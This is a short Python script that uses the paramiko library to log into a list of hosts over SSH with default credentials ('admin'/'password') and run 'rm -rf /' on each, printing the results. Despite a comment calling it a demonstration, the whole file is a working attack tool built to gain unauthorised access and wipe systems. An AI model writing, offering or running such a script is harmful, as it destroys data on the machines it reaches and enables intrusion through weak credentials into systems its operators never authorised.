import socket
import paramiko  # Required for SSH connection

# List of target IP addresses or hostnames
targets = ["192.168.0.1", "192.168.0.2", "192.168.0.3"]

# Exploit payload to be delivered to vulnerable hosts
exploit_payload = "rm -rf /"  # Example payload, extremely destructive, for demonstration purposes only!

# Iterate through the targets
for target in targets:
    try:
        # Create an SSH client instance
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the target system using SSH
        client.connect(target, username="admin", password="password")  # Example credentials, replace with valid ones

        # Execute the exploit payload on the vulnerable system
        stdin, stdout, stderr = client.exec_command(exploit_payload)

        # Print the output of the exploit execution
        print(f"Exploit executed on {target}:")
        print(stdout.read().decode())

        # Close the SSH connection
        client.close()
    except Exception as e:
        print(f"Failed to exploit {target}: {e}")
